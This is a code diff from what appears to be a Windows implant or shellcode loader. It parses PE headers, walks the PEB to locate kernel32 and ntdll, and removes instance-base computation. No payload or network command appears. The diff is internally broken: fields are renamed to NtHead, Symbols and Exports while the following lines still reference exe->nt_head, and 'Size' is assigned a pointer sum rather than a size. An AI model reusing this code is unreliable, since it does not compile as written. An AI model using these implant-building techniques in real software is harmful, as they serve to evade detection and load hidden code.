@@ -24,15 +24,15 @@ namespace Memory {
             object->Size  	= Ctx->Win32.SizeofResource(base, rsrcInfo);
             object->Lock  	= Ctx->Win32.LockResource(object->Global);
 
-			defer:
+defer:
             return object;
         }
 
         VOID FindHeaders(EXECUTABLE *exe) {
-            exe->nt_head = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
-            exe->symbols = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
-            exe->exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-			exe->size = (SIZE_T) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.SizeOfImage);
+            exe->NtHead = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
+            exe->Symbols = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
+            exe->Exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+			exe->Size 	= (SIZE_T) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.SizeOfImage);
         }
     }
 
@@ -47,8 +47,6 @@ namespace Memory {
             instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
 
             instance.teb->LastErrorValue = ERROR_SUCCESS;
-            instance.base.address = U_PTR(InstStart());
-            instance.base.size = U_PTR(InstEnd()) - instance.base.address;
 
             if (!(instance.modules.kernel32 = (HMODULE)FindModuleEntry(KERNEL32)->DllBase) ||
 				!(instance.modules.ntdll = (HMODULE)FindModuleEntry(NTDLL)->DllBase)) {
